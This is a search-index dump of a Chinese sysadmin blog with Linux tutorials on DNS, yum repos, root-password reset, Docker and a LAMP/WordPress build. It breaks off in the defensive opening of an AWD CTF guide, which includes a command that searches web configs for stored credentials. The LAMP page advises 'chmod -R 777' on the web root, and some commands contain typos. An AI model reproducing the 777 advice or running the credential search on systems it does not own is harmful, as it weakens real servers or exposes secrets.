其中type是服务类型有三种：hint（根区域）、master（主区域）、slave（辅助区域） ​ b. 其中file是域名与IP地址解析规则保存的文件地址。 ​ c. 其中allow-update是允许那些客户机动态更新解析信息，在配置从DNS服务器时使用。 编辑正向解析信息 注意区域文件中的file信息位置，在/var/named/文件夹下创建对应名字的文件“hehe.com.zone”, \"172.16.100.arpa\"。 [root@localhost ~]# cd /var/named/ [root@localhost named]# ls -al named.localhost -rw-r-----. 1 root named 152 Aug 25 01:31 named.localhost [root@localhost named]# cp -a named.localhost hehe.com.zone #注意此处使用-a选项的意义，为了连同named.localhost文件的文件属组信息一起复制出来，若没使用-a，后续可以用chown命令为相应文件进行修改。 [root@localhost named]# vim hehe.com.zone 对“hehe.com.zone”进行修改，二级域名c1的意思为“c1.hehe.com”，A记录即为ipv4记录。 编辑反向解析信息[root@localhost ~]# cd /var/named/ [root@localhost named]# ls -al named.loopback -rw-r-----. 1 root named 152 Aug 25 01:31 named.loopback [root@localhost named]# cp -a named.loopback 172.16.100.arpa [root@localhost named]# vim 172.16.100.arpa 测试配置文件是否出错 用named-checkzone命令对正向解析区域和反向解析区域进行测试是否有错。 named-checkzone 文件名 /var/named/文件名 四、测试 重启DNS服务，查看状态 [root@localhost named]# systemctl restart named //重启服务 [root@localhost named]# systemctl status named //查看运行状态 测试 使用另一台linux主机（客户端），编辑/etc/resolv.conf文件，添加一条解析记录指向DNS服务器IP： 用nslookup命令测试，出现以下两条信息说明正向和反向解析都已成功，此时使用ping命令pingDNS服务器域名也可ping通。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/RHEL8搭建本地yum源.html":{"url":"2.系统运维/RHEL8搭建本地yum源.html","title":"RHEL8搭建本地yum源","keywords":"","body":"一、前言 一台红帽linux虚拟机，一个红帽dvd镜像(iso)。 二、开始搭建 创建需要进行挂载的目录，并进行挂载 mkdir /mnt/cdrom #挂载点目录 mount /dev/src0 /mnt/cdrom 创建repo文件 编辑/etc/yum.repo.d/local.repo文件，填入以下内容： [BaseOS] name=BaseOS baseurl=file:///mnt/cdrom/BaseOS # 挂载点目录/BaseOS enabled=1 gpgcheck=0 [AppStream] name=AppStream baseurl=file:///mnt/cdrom/AppStream # 挂载点目录/AppStream enabled=1 gpgcheck=0 redhat8中，所有rpm包都被拆分为BaseOS和AppStream两个目录，BaseOS里面存放一些基础应用，AppStream里面存放其他的应用。两个都要配置，才能安装全部的iso里的软件。 验证是否可用 清理并刷新yum缓存 yum clean all # 清理yum缓存 yum repolist # 刷新yum缓存 随意安装一个引用如vim，看源是否可用 三、配置开机自动挂载（选做） 用blkid命令查看光盘文件属性，可以看到TYPE=\"iso9660\"和UUID=\"2022-06-29-06-15-46-00\" [aaa@localhost yum.repos.d]$ blkid /dev/sr0: UUID=\"2022-06-29-06-15-46-00\" LABEL=\"RHEL-8-2-0-BaseOS-x86_64\" TYPE=\"iso9660\" PTUUID=\"72cfe76b\" PTTYPE=\"dos\" [aaa@localhost yum.repos.d]$ 编辑/etc/fstab文件 写入以下内容： /dev/sr0 /mnt/cdrom iso9660 defaults 0 0 或者 UUID=2022-06-29-06-15-46-00 /mnt/cdrom iso9660 defaults 0 0 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/RHEL8重置Root密码.html":{"url":"2.系统运维/RHEL8重置Root密码.html","title":"RHEL8重置Root密码","keywords":"","body":" 关机重启，按e键进入内核编辑程序 找到指定位置输入rd.break，按Ctrl+X运行修改后的内核程序 3、依次输入以下命令，输入reboot重启 mount -o remount,rw /sysroot # 将文件系统以只读方式挂载在`/sysroot`目录下 chroot /sysroot # 进入chroot环境，让我们对系统文件进行安全的更改 passwd # 更改新密码 touch /.autorelabel # 让下一次系统引导时启用SELinux重新标记进程，登录成功的关键 exit # 退出chroot模式 reboot # 重启系统 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/Ubuntu常用软件包安装.html":{"url":"2.系统运维/Ubuntu常用软件包安装.html","title":"Ubuntu常用软件包安装","keywords":"","body":"1、bash命令补全工具 sudo apt-get -y install bash-completion # 在用户的shell中运行 source /etc/bash_completion 2、docker #卸载操作系统默认安装的docker， sudo apt-get remove docker docker-engine docker.io containerd runc #安装必要支持 sudo apt-get install apt-transport-https ca-certificates curl software-properties-common gnupg lsb-release -y #添加 Docker 官方 GPG key # Ubuntu curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg #Debian curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | apt-key add - #添加 apt 源: # Ubuntu echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null #Debian add-apt-repository \"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable\" #更新源 sudo apt-get update #安装最新版本的Docker # Ubuntu sudo apt-get install docker-ce docker-ce-cli containerd.io -y #Debian apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y 2）允许非Root用户执行docker 命令 # 添加docker用户组 sudo groupadd docker # 将当前用户添加到用户组 sudo usermod -aG docker $USER # 使权限生效 newgrp docker #如果没有此行命令，你会发现，当你每次打开新的终端 #你都必须先执行一次 “newgrp docker” 命令 #否则当前用户还是不可以执行docker命令 groupadd -f docker 3）配置docker镜像加速 sudo tee > /etc/docker/daemon.json 3、docker-compose # pip3安装（此方法不适用于Ubuntu22.04tls） sudo apt-get -y install python3-pip sudo pip3 install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple sudo pip3 install docker-compose -i https://pypi.tuna.tsinghua.edu.cn/simple # 软件包安装 cd /usr/local/bin/ sudo wget https://github.com/docker/compose/releases/download/v2.27.1/docker-compose-linux-x86_64 mv docker-compose-linux-x86_64 docker-compose sudo chmod +x docker-compose 4、Nginx # 安装相关依赖 sudo apt install -y curl gnupg2 ca-certificates lsb-release # 安装Nginx sudo apt install -y nginx 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Ubuntu系统网站搭建[LAMP].html":{"url":"2.系统运维/Ubuntu系统网站搭建[LAMP].html","title":"Ubuntu系统网站搭建[LAMP]","keywords":"","body":"前言 环境：Ubuntu 20.04 TLS 准备搭建环境：LAMP（Linux + Apache + Mysql + PHP） 搭建LAMP环境 1、安装Apache sudo apt-get install apache2 -y 验证：如果是本地主机，可以在浏览器输入127.0.0.1；如果是云服务器，可以再浏览器输入服务器提供商给的IP地址，出现以下界面则表示安装成功： 2、安装php sudo apt-get install php libapache2-mod-php -y sudo systemctl restart apache2 #重启apache服务 这里安装libapache2-mod-php的主要的原因是因为 libapache2-mod-php libapache2-mod-php 验证：在apache默认网页文件路径（/var/ww/html/）下创建一个文件1.php，输入以下内容 保存退出，在浏览器输入http://IP地址/1.php，出现以下界面，表示安装成功 3、安装MySQL及其相关php组件 sudo apt-get install mysql -y #安装mysql sudo apt-get install php-mysql #安装php相关组件 4、安装phpmyadmin（可视化数据库管理界面） sudo apt-get install phpmyadmin -y sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin #建立 /var/www/html 下的软连接 sudo systemctl restart mysql #重启 MySQL 服务 sudo systemctl restart apache2.service #重启 Apache 服务 创建软链接的目的是让我们在进入phpmyadmin时更加的方便一点，只要在浏览器输入http://IP地址/phpmyadmin 创建wordpress数据库 mysql -u root -p #进入mysqlroot账户，初次进入会设置密码 CREATE DATABASE 数据库名称; #创建数据库 CREATE USER ‘用户名’@‘%’ IDENTIFIED BY ‘密码’; #创建用户（远程用户）并设置密码用于连接wordpress GRANT ALL PRIVILEGES ON 数据库名称.* TO ‘用户名’@‘%'; #给创建的用户权限 FLUSH PRIVILEGES; #生效设置 exit; #退出 输入命令时注意最后的‘；’号，还有在赋权时数据库名称后面的‘.*’，创建成功之后可以进入phpmyadmin后台验证是否能够登录。 wordpress下载配置 进入wordpress官网[icon-url href=\"https://cn.wordpress.org/download/\"]找到（下载.tar.gz）,右键复制下载链接； 在linux终端输入 wget 复制的链接 tar -zxvf 压缩包名 sudo wget https://cn.wordpress.org/latest-zh_CN.tar.gz sudo tar -zxvf latest-zh_CN.tar.gz 先将apache目录下的index.php进行重命名（目的是改变Apache默认打开的网页） sudo mv /var/www/html/index.html /var/www/html/index~.html 再将解压的wordpress文件全部移动到Apache文件目录下 sudo mv wordpress/* /var/www/html/ 然后给html下的文件进行赋权限 sudo chmod -R 777 /var/www/html/ #shiji实际上不用这么高的权限，但是我这里图个方便直接给最高权限 重启Apache服务，配置完成 sudo systemctl restart apache2 配置完后，即可进入浏览器配置网站的相关配置了，在浏览器输入IP地址，进入wordpress配置，按照要求填写之前创建的数据库信息，和网站信息，完成后你就能拥有一个属于自己的网站了[撒花][撒花][撒花] 结语 到这里我们已经拥有了自己的网站了，但是这样子并不算已经上线，因为我们还没有域名，下一步我们将会给网站链接一个域名，实现域名访问[期待]。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/Ubuntu镜像源加速.html":{"url":"2.系统运维/Ubuntu镜像源加速.html","title":"Ubuntu镜像源加速","keywords":"","body":"前言 国内镜像源汇总 镜像源文件 sudo vim /etc/apt/sources.list ## 基础源 deb 镜像源地址 版本名 main restricted universe multiverse deb-src 镜像源地址 版本名 main restricted universe multiverse deb 镜像源地址 版本名-updates main restricted universe multiverse deb-src 镜像源地址 版本名-updates main restricted universe multiverse deb 镜像源地址 版本名-backports main restricted universe multiverse deb-src 镜像源地址 版本名-backports main restricted universe multiverse ## 安全更新源，包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb 镜像源地址 版本名-security main restricted universe multiverse deb-src 镜像源地址 版本名-security main restricted universe multiverse ## 预发布软件源，不建议启用 # deb 镜像源地址 版本名-proposed main restricted universe multiverse # deb-src 镜像源地址 版本名-proposed main restricted universe multiverse 一、阿里云镜像加速（全版本） ubuntu 14.04 LTS (trusty) (EOL) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse ## Not recommended # deb https://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse ubuntu 16.04 LTS (xenial) (EOL) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ xenial main deb-src https://mirrors.aliyun.com/ubuntu/ xenial main deb https://mirrors.aliyun.com/ubuntu/ xenial-updates main deb-src https://mirrors.aliyun.com/ubuntu/ xenial-updates main deb https://mirrors.aliyun.com/ubuntu/ xenial universe deb-src https://mirrors.aliyun.com/ubuntu/ xenial universe deb https://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb-src https://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb https://mirrors.aliyun.com/ubuntu/ xenial-security main deb-src https://mirrors.aliyun.com/ubuntu/ xenial-security main deb https://mirrors.aliyun.com/ubuntu/ xenial-security universe deb-src https://mirrors.aliyun.com/ubuntu/ xenial-security universe ubuntu 18.04 LTS (bionic) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse ubuntu 20.04 LTS (focal) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse ubuntu 22.04 LTS (jammy) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse ubuntu 23.04 (lunar) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ lunar main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ lunar-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ lunar-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ lunar-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ lunar-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ lunar-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar-backports main restricted universe multiverse ubuntu 24.04 (noble) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ noble main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ noble-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ noble-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ noble-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ noble-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ noble-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble-backports main restricted universe multiverse 二、清华镜像加速（全版本） ubuntu 14.04 LTS (trusty) (EOL) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse ubuntu 16.04 LTS (xenial) (EOL) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse ubuntu 18.04 LTS (bionic) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse ubuntu 20.04 LTS (focal) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse ubuntu 22.04 LTS (jammy) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse ubuntu 23.04 (lunar) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-proposed main restricted universe multiverse ubuntu 24.04 (noble) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-proposed main restricted universe multiverse 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"3.网络安全/AWD/AWD-Guide.html":{"url":"3.网络安全/AWD/AWD-Guide.html","title":"AWD Guide","keywords":"","body":"AWD比赛指导手册 https://blog.csdn.net/qq_18741387/article/details/109543511 纸上得来终觉浅,绝知此事要躬行。 手册版本号：V1.2.2-2023/10/21 这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容。如果你要参加AWD相关比赛，相信本项目能给你带来帮助~ 如何在线阅读？ 个人博客地址： https://blog.zgsec.cn/archives/484.html 微信公众号地址：https://mp.weixin.qq.com/s/1vR1rcGHK6YYdXlp4McR_w 如果你觉得本项目不错，欢迎给我点个Star，万分感谢~~ 有什么新的攻击或者防守的姿势、手法，欢迎与我交流 0# 什么是AWD 0.1# AWD赛制介绍 「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。 在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。 主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。 0.2# 比赛整体流程 赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 SSH 或者 VNC 的用户名和密码，还有相关IP等信息 安全加固环节：我们需要先自己去登录靶机服务器，进行30分钟的安全加固（源码备份/弱口令修改/代码审计和修复/漏洞修复等） 自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令/Web漏洞/系统漏洞等）获得Flag进行加分，对应队伍失分 1# 比赛环境 通常比赛环境有以下三种情况： 混合靶机情况：运维机器 Windows 10 + 攻击机 Kali Linux + Win靶机 Windows Server 2003/2008/2012 或者 Windows 7 + Linux靶机 Centos7.x 或者 Ubuntu 16.04/17.01/20.04 纯Linux靶机情况：运维机器 Windows 10 + 攻击机 Kali Linux + Linux靶机 Centos7.x 或者 Ubuntu 16.04/17.01/20.04 纯Windows靶机情况：运维机器 Windows 10 + 攻击机 Kali Linux + Win靶机 Windows Server 2003/2008/2012 或者 Windows 7 可能有师傅这里看不太懂，那我可以用大白话描述一下：比赛的时候，会给你1~2台运维机器（一般是Win10里面装了Kali）以及好几台服务器（也就是上面说的靶机），服务器上面有漏洞，要先抓紧去找到漏洞并修复（可别忘了弱口令哦），再通过找到的漏洞去攻击别的队伍的服务器拿到Flag从而得分 2# 安全加固环节（Defense） 2.0# 基本加固流程 2.0.1 Windows加固流程 先备份：Web源码、数据库 445加固，开启防火墙或IP高级安全策略 开启系统日志审计功能 禁用guest账户、关闭文件共享 确保启动项内容是可控的 限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置-->管理模板-->Windows组件-->远程桌面服务-->远程桌面会话主机-->连接-->限制连接的数量 使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe 恶意代码文件，通过PCHunter、Monitor查找 Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容 NTFS扫描磁盘查找隐藏的交换流数据 查找系统所有账户信息，禁止非Administrator账户 修改Web站点管理员访问路径、默认口令、数据库口令 安装WAF脚本，防护Web站点，禁止其他漏洞 2.0.2 Linux加固流程 先备份：Web源码、数据库 系统口令修改，团队统一口令 通过 .bash_history 查找历史命令操作，发现痕迹 查看计划任务：crontab -l；编辑计划任务：crontab -e 查看 /etc/init.d/rc.local 中启动服务有无异常 使用脚本开启进程监控、目录监控、流量监控 Web站点口令,站点管理员路径修改 系统加固：iptable 2.1# 基本信息搜集 在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆” 2.1.1 明确Linux机器信息 uname -a //系统信息 ps -aux //查询进程信息 ps -ef | grep 进程名称 //筛选指定进程 id //用于显示用户ID，以及所属群组ID cat /etc/passwd //查看用户情况 ls /home/ //查看用户情况 find / -type d -perm -002 //可写目录检查 ifconfig //Linux上查看网卡信息 ip addr show //Linux上查看网卡信息 2.1.2 明确Windows机器信息 whoami /all //Windows上查看用户详细信息 ipconfig /all //Windows上查看网卡信息 2.1.3 查看开放端口 netstat //查看活动连接 netstat -ano/-a //查看端口情况 netstat -anp //查看端口 firewall-cmd --zone= public --remove-port=80/tcp -permanent //关闭端口 firewall-cmd -reload //防火墙重启 2.1.4 默认口令（弱口令）更改 为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456 还有其他默认密码admin，top100， top1000等 尤其是WEB应用的后台密码修改 passwd username //ssh口令修改 set password for mycms@localhost = password('18ciweufhi28746'); //MySQL密码修改 find /var/www//html -path '*config*’ //查找配置文件中的密码凭证 2.1.5 找本地Flag grep -r \"flag\" /var/www/html/ //Linux：在Web目录下查找flag findstr /s /i \"flag\" *.* //Windows：当前目录以及所有子目录下的所有文件中查找\"flag\"这个字符串 2.1.6 设置禁Ping echo \"1\" > /proc/sys/net/ipv4/icmp_echo_ignore_all //临时开启禁ping echo \"0\" > 